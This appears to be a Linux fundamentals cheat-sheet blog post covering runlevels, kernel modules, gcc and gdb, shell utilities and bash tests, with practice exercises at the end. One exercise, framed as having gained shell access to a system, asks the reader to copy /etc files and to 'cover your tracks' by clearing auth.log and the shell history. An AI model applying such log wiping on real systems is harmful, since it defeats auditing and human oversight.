<ul type="i">
<li>Linux Boot Process:
<ol>
<li>BIOS starts the boot loader.</li>
<li>Boot loader loads the kernel into memory.</li>
<li>The Kernel mounts disks/partitions and starts the init daemon.</li>
<li>The init daemon starts services based on the runlevel.</li>
</ol></li>
<li>Linux has six runlevels 0-6. Scripts are contained in /etc/rc[0-6,S].d/. Each folder contains the scripts which are followed by either K or S. If the first letter is K that script is not executed. If S, that script is executed. /etc/inittab contains the default run level.
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;border-color:#ccc;}
.tg td{font-family:Arial, sans-serif;font-size:14px;padding:4px 4px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#ccc;color:#333;background-color:#fff;}
.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:4px 4px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#ccc;color:#333;background-color:#f0f0f0;}
</style><table class="tg">
  <tr>
    <th class="tg-031e">ID</th>
    <th class="tg-031e">Name</th>
    <th class="tg-031e">Description</th>
  </tr>
  <tr>
    <td class="tg-031e">0</td>
    <td class="tg-031e">Halt</td>
    <td class="tg-031e">Shuts down the system.</td>
  </tr>
  <tr>
    <td class="tg-031e">1</td>
    <td class="tg-031e">Single-user Mode</td>
    <td class="tg-031e">Mode for administrative tasks.</td>
  </tr>
  <tr>
    <td class="tg-031e">2</td>
    <td class="tg-031e">Multi-user Mode</td>
    <td class="tg-031e">Does not configure network interfaces and does not export networks services.</td>
  </tr>
  <tr>
    <td class="tg-031e">3</td>
    <td class="tg-031e">Multi-user Mode with Networking</td>
    <td class="tg-031e">Starts the system normally.</td>
  </tr>
  <tr>
    <td class="tg-031e">4</td>
    <td class="tg-031e">Not used/User-definable</td>
    <td class="tg-031e">For special purposes.</td>
  </tr>
  <tr>
    <td class="tg-031e">5</td>
    <td class="tg-031e">Start system normally with display manager. ( with GUI )</td>
    <td class="tg-031e">Same as runlevel 3 + display manager.</td>
  </tr>
  <tr>
    <td class="tg-031e">6</td>
    <td class="tg-031e">Reboot</td>
    <td class="tg-031e">Reboot the system.</td>
  </tr>
</table>
</li>


<li>Sysctl - configure kernel parameters
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/sysctl.conf                : Contains the variables for kernel parameters.
</span><span class='line'>sysctl -a                       : Display all the kernel parameters
</span><span class='line'>sysctl -w &lt;kernel parameter>    : Change a sysctl setting.
</span><span class='line'>PS: To make permanent changes to the kernel, edit the /etc/sysctl.conf file.</span></code></pre></td></tr></table></div></figure>
</li>
<li> Kernel Modules contained in /lib/modules/$(uname -r)/
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsmod      : list all loaded modules
</span><span class='line'>modprobe   : load kernel modules
</span><span class='line'>lspci      : list all pci devices
</span><span class='line'>lsusb      : list all usb devices
</span><span class='line'>hal-device : list all the Hardware Abstraction layer devices</span></code></pre></td></tr></table></div></figure></li>
<li>Debian GNU provides a convenient tool to manage runlevels (to control when services are started and shut down); it&#8217;s called update-rc.d and there are two commonly used invocation methods:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update-rc.d -f &lt;service name> remove : Disabling a service
</span><span class='line'>update-rc.d &lt;service name> defaults  : Insert links using defaults, start in runlevel 2-5 and stop in runlevels 0,1 and 6.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Programming Related
<ul>
<li>GIT: Version Control System, really useful for tracking your changes.
<br>
TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
<li>gcc - GNU Compile Collection:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>To Compile: gcc -Wall -pedantic -g &lt;C source file> -o &lt;Executable file>
</span><span class='line'>-Wall -pedantic : to check for all the warnings and errors if any.
</span><span class='line'>-g              : to create the symbol file to be used by gdb 
</span><span class='line'>-o              : to create the executable file.</span></code></pre></td></tr></table></div></figure></li>
<li>GDB: GNU debugger
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -tui &lt;Program name>
</span><span class='line'>-tui              : for listing the source while debugging
</span><span class='line'>b &lt;linenumber>    : to set the break point
</span><span class='line'>p &lt;variable name> : to print the value of the variable
</span><span class='line'>bt                : to print the stack call, mainly useful to find segmentation fault when multiple functions are called.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Gathering Information
<ul>
<li>From Files
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/issue     : Contains the message which is displayed on terminal before login. 
</span><span class='line'>/etc/motd      : Contains the message which is displayed on terminal after login.
</span><span class='line'>/proc/cpuinfo  : provides information about cpu.
</span><span class='line'>/proc/meminfo  : provides information about memory/ RAM.
</span><span class='line'>/proc/version  : provides information about the version of your system.</span></code></pre></td></tr></table></div></figure>
</li>
<li>From Commands
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>last      : shows all the login attempts and the reboot occurred.
</span><span class='line'>lastb     : shows all the bad login attempts. 
</span><span class='line'>lastlog   : shows the list of all the users and when did they login.
</span><span class='line'>id        : print real and effective user and group IDs.
</span><span class='line'>whoami    : whoami - print effective userid.
</span><span class='line'>uname     : print system information.
</span><span class='line'>      -a  : print all the information (Kernel name, nodename, kernel-release, kernel-version, machine, processor, hardware-platform)
</span><span class='line'>pstree    : display a tree of processes.
</span><span class='line'>hostname  : prints out the hostname of the machine which is stored in /etc/hostname.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Useful Utilites/Commands
<ul>
<li>Copy - Copy files and directories.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp &lt;SOURCE> &lt;DIRECTORY>
</span><span class='line'>-r        : recursive.
</span><span class='line'>-a        : similar to preserve,
</span><span class='line'>-p        : preserve
</span><span class='line'>-v        : verbose.</span></code></pre></td></tr></table></div></figure>
</li>
<li>cut - remove sections from each line of files.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-d        : use DELIM instead of TAB for field delimiter.
</span><span class='line'>-f        : select only these fields.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Pipes
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>\>        : direct normal output.
</span><span class='line'>2>        : direct error output.
</span><span class='line'>&>        : direct all output.</span></code></pre></td></tr></table></div></figure>
</li>

<li>tar - Archiving utility
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-c        : create archive
</span><span class='line'>-t        : list the content of the file
</span><span class='line'>-x        : extract the files
</span><span class='line'>-j        : bzip2 format
</span><span class='line'>-z        : gzip format</span></code></pre></td></tr></table></div></figure>
</li>

<li>find - Searching files
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-user       : File is owned by user uname (numeric user ID allowed).
</span><span class='line'>-group      : File belongs to group gname (numeric group ID allowed).
</span><span class='line'>-size       : File uses n units of space. c/k/M/G: bytes/Kilobytes/Megabytes/Gigabytes.
</span><span class='line'>-name       :
</span><span class='line'>
</span><span class='line'>#Delete empty file and directories:
</span><span class='line'>find -empty -type d -delete
</span><span class='line'>find -empty -type f -delete
</span><span class='line'>
</span><span class='line'>#Find each file in the current directory and tell it's type and grep JPEG files.
</span><span class='line'>find . -type f -exec file {} + | grep JPEG</span></code></pre></td></tr></table></div></figure>
</li>

<li>Some other
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nm-applet : a applet for network manager.
</span><span class='line'>wc        : print newline, word, and byte counts for each file.
</span><span class='line'>   -c     : print the bytes count.
</span><span class='line'>   -l     : print the lines count.
</span><span class='line'>   -w     : print the word count.
</span><span class='line'>sort      : sort lines of text files.
</span><span class='line'>diff      : compare files line by line.
</span><span class='line'>less      : print information one per page.
</span><span class='line'>more      : prints information one per page.
</span><span class='line'>head      : prints first 10 lines
</span><span class='line'>tail      : prints last 10 lines.
</span><span class='line'>whatis    : Provides a one line description of the commands.
</span><span class='line'>which     : locate a command.
</span><span class='line'>whereis   : locate the binary, source, and manual page files for a command.
</span><span class='line'>locate    : find files by name
</span><span class='line'>cal       : Display calendar
</span><span class='line'>date      : Display date. Date command provides multiples options for displaying day and time, very helpful in creating backups with name having time and date.
</span><span class='line'>tr        : Converts from smaller to uppercase. tr stands for translate.
</span><span class='line'>   -d     : delete characters in the text.
</span><span class='line'>tee       : saves output in file as well as forward it.
</span><span class='line'>touch     : Create zero byte files, mainly used for changing the timestamps of the file.
</span><span class='line'>make      : If your program source file name is test.c/cpp, then you can directly write make test, this would compile the test.c/cpp program. Remember this it's a faster way.
</span><span class='line'>stat      : View detailed information about a file, including its name,size, last modified date, and permissons.
</span><span class='line'>uniq      : Report or omit repeated lines.
</span><span class='line'>   -c     : prefix lines by the number of occurrences. (--count)</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Special Characters:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*(asterik)          : A wildcard used to represent zero or more characters in a filename. For example: ls *.txt will list all the names ending in ".txt" such as "file1.txt" and "file23.txt".
</span><span class='line'>?(question mark)    : A wildcard used to represent a single character in a filename. For example ls pic?.jpg would match "pic1.jpg" and "pic2.jpg" but not "pic24.jpg" or "pic.jpg".
</span><span class='line'>[](square brackets) : These are used to specify a range of values to match. For example, "[0-9]" and "[a-z]".
</span><span class='line'>;(semi colon)       : Command separator that can be used to run multiple commands on a single line unconditionally.
</span><span class='line'>&&(double ampersand): Command separator which will only run the second command if the first one is successful (does not return an error.)
</span><span class='line'>||(double pipe)     : Command separator which will only run the second command if the first command failed (had errors). Commonly used to terminate the script if an important command fails.</span></code></pre></td></tr></table></div></figure></li>
<li>Few Important Differences in Commands:
<ol type="i">
<li> su&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp; Change users or become superuser. The difference between su - <username> and su <username> is that former su - would switch to the new user directory. It would also change the environment variable according to the changed user.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>su -c "command" : Specify a command that will be invoked by the shell using its -c.</span></code></pre></td></tr></table></div></figure></li>
<li>sudo&nbsp;&nbsp; :&nbsp; execute a command as another user. The difference between su and sudo is &#8216;su&#8217; forces you to share your root password to other users whereas &#8216;sudo&#8217; makes it possible to execute system commands without root password. &#8216;sudo&#8217; lets you use your own password to execute system commands i.e. delegates system responsibility without root password.</li>
</ol></li>
<br>
<li>Tips and Tricks
<ul>
<li>Scan files for a text present in them
Find a way to scan my entire linux system for all files containing a specific string of text. Just to clarify, I&#8217;m looking for text within the file, not in the file name.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -rnw 'directory' -e "pattern" --include={*.c,*.h} --exclude=*.o
</span><span class='line'>-r                    : search recursively
</span><span class='line'>-n                    : print line number
</span><span class='line'>-w                    : match the whole word. 
</span><span class='line'>--include={*.c,*.h}   : Only search through the files which have .c or .h extensions.
</span><span class='line'>--exclude=*.o         : Exclude searching in files with .o extensions.
</span><span class='line'>PS: --exclude or --include parameter could be used for efficient searching. 
</span><span class='line'>
</span><span class='line'>-i, --ignore-case     : 'it DoesNt MatTTer WhaT thE CAse Is'
</span><span class='line'>-v, --invert-match    : 'everything , BUT that text'
</span><span class='line'>-A &lt;NUM>              : Print NUM lines of trailing context after matching lines.
</span><span class='line'>-B &lt;NUM>              : Print NUM lines of trailing context before matching lines.
</span><span class='line'>-a, --text            : Process a binary file as if it were text; this is equivalent to the --binary-files=text option.</span></code></pre></td></tr></table></div></figure>
</li>
<li>We often do mistakes while updating using apt-get which just leaves us with command line access to the system (GUI messed up). Possibly we unintentionally removed some neccessary packages.
<br>
<br>
In this case, look for /var/log/apt/history.log, look for the time around which your system was broken. Copy the removed packages
which would be in the format of 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>libapt-inst1.5:amd64 (0.9.7.9+deb7u5, 0.9.7.9+deb7u6), apt-utils:amd64 (0.9.7.9+deb7u5, 0.9.7.9+deb7u6).</span></code></pre></td></tr></table></div></figure>
To reinstall these packages you just need the package name such as 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>libapt-inst1.5, apt-utils.</span></code></pre></td></tr></table></div></figure>

<ul>
<li>Step1: Use sed to search for pattern &#8220;), &#8221; and replace it with &#8220;), \n&#8221;. This would separate the packages by new line. Within vi &#8220;:%s/), /\n/g&#8221;</li>
<li>Step2: Use cut -d &#8220;:&#8221; -f 1 to remove :amd64 and anything after that.</li>
<li>Step3: Now we have to get them back in one line rather than multiple lines. Within vi &#8220;:%s/\n/ /g&#8221;</li>
</ul>
</li>
<li>Want to keep track of etc directory? 
<br>
Etckeeper may be a bit more advanced, and it is used to put your whole /etc directory under revision control. 
To install and initialize it,
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install etckeeper
</span><span class='line'>etckeeper init
</span><span class='line'>cd /etc
</span><span class='line'>git commit -am Initial</span></code></pre></td></tr></table></div></figure> 
After that, you can see pending changes in /etc by cd-ing into it and running 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git status or git diff</span></code></pre></td></tr></table></div></figure> at any time, and you can see previous, committed changes by running 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git log or git log -p</span></code></pre></td></tr></table></div></figure> You can override pending changes to any file with the last committed version with 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git checkout FILENAME</span></code></pre></td></tr></table></div></figure>
</li>

</ul>
</li>

<li>Bash equality Tests
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>test       : checks file types and compare values
</span><span class='line'>   -d      : check if the file is a directory
</span><span class='line'>   -e      : check if the file exists
</span><span class='line'>   -f      : check if the file is a regular file
</span><span class='line'>   -g      : check if the file has SGID permissions
</span><span class='line'>   -r      : check if the file is readable
</span><span class='line'>   -s      : check if the file's size is not 0
</span><span class='line'>   -u      : check if the file has SUID permissions
</span><span class='line'>   -w      : check if the file is writeable
</span><span class='line'>   -x      : check if the file is executable</span></code></pre></td></tr></table></div></figure>
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if test -f /etc/foo.txt
</span><span class='line'>then
</span><span class='line'>
</span><span class='line'>It can also be written as 
</span><span class='line'>
</span><span class='line'>if [ -f /etc/foo.txt ]; then
</span><span class='line'>
</span><span class='line'>--square brackets [] form test.
</span><span class='line'>-- There has to be white space surrounding both square bracket</span></code></pre></td></tr></table></div></figure>
List of equality tests:
<ul>
<li>
Checks equality between numbers:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>x -eq y         : Check is x is equals to y
</span><span class='line'>x -ne y         : Check if x is not equals to y
</span><span class='line'>x -gt y         : Check if x is greater than y
</span><span class='line'>x -lt y         : Check if x is less than y</span></code></pre></td></tr></table></div></figure></li>
<li>Checks equality between strings:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>x = y           : Check if x is the same as y
</span><span class='line'>x != y          : Check if x is not the same as y
</span><span class='line'>-n x            : Evaluates to true if x is not null
</span><span class='line'>-z x            : Evaluates to true if x is null.</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li>

<li>Some Important Definitions:
<br>
We want our information to:
<ul>
<li>be read by only the right people (confidentiality)</li>
<li>only be changed by authorised people or processes (integrity)</li>
<li>be available to read and use whenever we want (availability).</li>
</ul>
<br>
Non-repudiation is about ensuring that users cannot deny knowledge of sending a message or performing some online activity at some later point in time. For example, in an online banking system the user cannot be allowed to claim that they didn’t send a payment to a recipient after the bank has transferred the funds to the recipient’s account.</li>

</ol>


<p><strong>TODO</strong></p>

<p>That was most probably a lot of information, to practice all the it&rsquo;s always better to do some hands on.</p>

<ol>

<li>To Learn Programming, Debugging and Git
<ul>
<li> To learn git, would suggest to do a 15 min tutorial on <a href="try.github.com">try.github.com</a>.</li>
<li> Create a small program using vi with syntax on, compile it using gcc using make.</li>
<li> Debug it using gdb -tui option to see the source code, experiment with breakpoints, and printing values.</li>
<li> Track that program using git, upload them to a remote server, then pull your code, check if its the same.</li>
</ul>
</li>

<li>To learn System administration
<ul>
<li> Change the messages before login, after login. Remember the escapes sequences used in the /etc/issue.  man agetty lists them.</li>
<li> Supposed you got access via shell to a linux system and extract some information from it. Create a script
<ul>
<li>Create a alice, bob, eve with the password &#8220;password&#8221; HINT: set password using chpasswd, look some examples in google to change from cmdline.</li>
<li>Login from eve.</li>
<li>Copy and preserve all the configuration files from /etc and save it in eve home directory in the folder etc-backup-YYYYMMDD, direct all errors to cp.err</li>
<li>Change the owner of all the files in the folder just created to bob and the group of all the files to alice and change the permission of all the files to 440 i.e r&#8211;r&#8212;&#8211;
HINT: would have to be logined as root</li>
<li>Provide me all the unique shells used by the user present in the system in CAPS. HINT: /etc/passwd file contains all the shells, three four commands would be used.</li>
<li>Cover your tracks, clear out the /var/log/auth.log (Have a look at this file and create a backup before clearing), clean your terminal history
HINT: man pages would help you.</li>
<li>Delete all the user bob, alice, eve. Make sure you delete there files too.</li>
</ul>
</li>
<li> Turn off the ping responses for your system permanently and turn on the Syn-cookies protection mechanism. {Search on Google}</li>
<li> Use your previous script to create three users alice, bob, eve. 
<ul>
<li>-create a folder dept inside it two folder hr, web. </li>
<li>create two group hr and web.</li>
<li>change group of web folder to web and hr to hr.</li>
<li>add alice and bob user to web group</li>
<li>add alice to hr group.</li>
<li>check that bob is not able to enter in the hr folder and alice is able to enter in both hr and web folder</li>
<li>-add user bob to sudo group and check if it is able to run sudo ifconfig ?</li>
</ul>
</li>
<li>Objective to get few IP addresses of Microsoft.com Domains.
<ul>
<li>Download the index.html page of microsoft.com</li>
<li>Every link in html is referred by href. Filter all the href (which would contain the link to different domains for Microsoft)</li>
<li>Sort and find unique list. Get their ip addresses</li>
<li>HINT: Tools such as cut, grep, wget, sort, uniq, host and little bit of bash scripting would be used.</li>
</ul></li>
</ul>
</li>
</ol>

]]></content>
  </entry>
  
</feed>
